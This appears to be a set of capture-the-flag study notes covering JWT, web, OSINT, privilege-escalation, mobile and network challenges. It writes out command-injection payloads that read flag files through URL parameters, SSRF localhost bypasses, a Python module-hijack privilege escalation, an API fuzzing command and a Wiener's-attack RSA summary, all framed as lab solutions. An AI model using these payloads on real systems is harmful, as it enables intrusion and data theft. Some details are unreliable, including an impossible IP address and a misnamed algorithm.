## JSON Web Tokens Challenge

{"user":"admin", "is_admin":"tt"}
 Am observat ca url encoding-ul nu are voie sa aiba == la final, deci trebuie sa mai completam cu spatii din cand in cand.


{"alg":"HS256","typ":"JWT"}
{"user":"admin", "is_admin":"tt", "flag":"t",  "pin":"0770"}


43 54 46 7B 74 68 31 73

['3c','7','2a','2a','20','26','78','3','5a','1a','68','0','27','0a','64','0f','4b','14','5f','0a','64','0f','55','0a','55','15','55','20','34','1','2a','2a','35','2a','21','20','21','23','21','23','64','19']


ctf{g3t-3xiftool-to-f1ni$h-th3-ch4l1}


# WEB
## pygmentize

- When working with websites where you can gain RCE through the error messages, if nothing shows up, try `BASE64 ENCODING` your \`cat flag.txt\`; also use `` to get the output of a SHELL command

If the flag is cut off, then you can use `base64 -w0 `

- `DID YOU KNOW?` By default, base64 command line utility inserts a LINE BREAK after every 76 characters in the output to conform to MIME specifications for line length limitations. USE `-w0` to disable this feature


- SO for the pygmentize challenge we can use the test command: /?a=1&b=2;ls

- We can see the output is saying the ls command was not recognised. So ls is trying to be executed

- NOW, if we do: /?a=1&b=;`ls` -> sh: 1 composer.json:not found -> we executed the command but it only displays the first command(space delimited)
WORKAROUNDS: || base64 encode it || OR  || concatenate it with  ;`ls|tr '\n' '-'` ||

### Possible solutions :

- `SOL1`     /?a=1&b=;\`cat flag.php | base64 -w0\` -> and then base64 -d the flag
- `SOL2`     /?a=1;b=;\`cat flag.php|tr '\n' '-'|tr ' ' '-'`
- `SOL3`     /?a=<?php phpinfo();&b=;cat flag.php #      BE CAREFUL AT THE URL ENCODING, some chars might mess up the payload

Which gives this output: <?php--$flag_4f3qdw-=-"ctf{2ae4644b1e4cbc1f560c52f3ee0985043d3e0acf0f766851382974646578ec39}";--?>


- `If you find the Github repo for a tool like pygmentize, the first place to look is GITHUB ISSUES!!!`

-  here you can find a `REMOTE CODE EXECUTION issue with` the exact payload to solve the problem
-  /?a=%3C?php%20phpinfo();&b=;cat%20flag.php%20%23 
 
>	ex: $highlight = Pygmentize::highlight('<?php phpinfo();', ';uname -a #');
print_r($highlight);
https://github.com/dedalozzo/pygmentize/issues/1

## sided-curl

- We see that the request: http://google.com/test
-> returns an error with the path test.png not found on the system

- We see a potential `SSRF attack`
- SSRF = Server-side Request Forgery is when an attacker manipulates a server-side application into making HTTP requests to a domain of their choice(even internal domains).

- The idea is to access local domains, like localhost

- So we try to access 127.0.0.1:8000 because that is where the admin panel should be hosted. But we get incvalid URL. So we use the trick 'http://USERNAME.PASSWORD@DOMAIN.COM' that is used for BASIC AUTHENTICATION to a website within the url. We can call 'http://google.com@127.0.0.1:8000' - this will access localhost on port 8000 with the username google and password com, but since there is no authentication implemented/needed it will get ignored.

- Then we explore there, we see /admin asks for a userrname and password, we provide as default admin:admin -> And we see that THE URL IS TOO LONG.

- Looking for SSRF online payloads for localhost, we stumble upon this: `127.0.0.1:80 == 0:80`
- And this will give us the flag

# OSINT
## persistent-recon

- This challenge welcomes us with a login page. 

- To find the default credentials we have to find out what this website is default for online. Like what service usually looks like this.

- We use `GOOGLE LENS` for this, we insert a screenshot of our website and we get an exact match on this domain -> docs.westermo.com/
- So we seach westermo default username and password and we get: [admin:westermo]
- This gives us the flag.

# PRIVESC
## PRIVILEGE-NOT-INCLUDED

- This challenge showed a 'include.py' file that was in the /home/helpdesk folder to which we had access to.
- This file is owned by admin, and we can see when running ps a process that does 'sleep 60', hinting to a timed process that is running once every minute as admin.

- This include.py can be inspected, we can see it import some file like: 'import include_php', and upon running the script it cannot find that module. BUT WE CAN CREATE ONE.

- We will write a script in python: include_php.py that will write the flag into the /tmp folder to which we have access to.

# MOBILE CHALLENGES

Use `https://appetize.io/upload` to run in an emulated environment the apk

## flagen

- For this we see that we have to connect to a network address, we are given one by the challenge, so probably some requests are gonna happen. We can start the 'Network traffic analyzer' from the appetize.io website, and we can capture some get requests to an api endpoint. Since the api endpoint may have other endpoints also, we scan the path: 2818.82.92.1111:8000/FUZZ, where we replace fuzz with some API PAYLOADS.

- We can also checkout the API requests from BurpSuite if we add the correct API KEY in the GET Header.

- For this attack I used the tool `ffuf (Fuzz Faster U FOOL)` like this: 

		ffuf -c -t 100 -u http://34.89.210.219:30870/FUZZ -w /usr/share/wordlists/api-endpoints.txt -H "X-API-KEY: FBA34-E4Q4D3-E5C8XB1-DDA9A-26ED76"

-  this will reveal a /swagger endpoint
- here we can see Active API HTTP schemes with 2 paths: one for /api/v1/getdata and the other one for /api/v1/getfl. 
- By accessing the second path with the API KEY, we will get the flag!!!

Check out more on API hacking.

# Network Analysis
## traffic - e

- This challenge has an encrypted message over TLSv1.2 which uses RSA encryption algorithm. To solve this challenge, we need to decrypt the RSA private key by using a tool like RsaCtfTool. -> then decrypt the trafic to get the flag.

Let's revise a little bit the technical part: PUBLIC KEY CRYPTOGRAPHY
- In public key cryptography, each participant has a PAIR OF KEYS, a PUBLIC key and a PRIVATE key
	PUBLIC KEY: used for encryption
	PRIVATE KEY: used for decryption
	A public key corresponds to ONE PRIVATE KEY.
	
- The RSA encryption algorithm: 
	- choose p an q distinct large prime numbers.
	- MODULUS : n = p*q, n is used as the modulus for both the public and private keys
	- EULER's TOTIENT : theta(n) = (p-1)*(q-1) , where theta is called Euler's totient function.
	- PUBLIC EXPONENT : Choose an integer e such that 1 < e < theta(n); e is coprime with theta(n)
	- PRIVATE EXPONENT : d = e^(-1) mod theta(n) -> the modular inverse of the public exponent modulus the totient -> can be computed using Euler's Extended Algorithm.
	
- THE PUBLIC KEY IS : (e, n)
- The private KEY is : (d, n)

- To encrypt a message : C = M^e mod n
- To decrypt a message : M = C^d mod n

RSA's security relies on the mathematical difficulty of factoring large composite numbers into their prime factors. 

In this challenge, Wiener's attack was used because the PRIVATE EXPONENT D is significantly smaller than the modulus N.











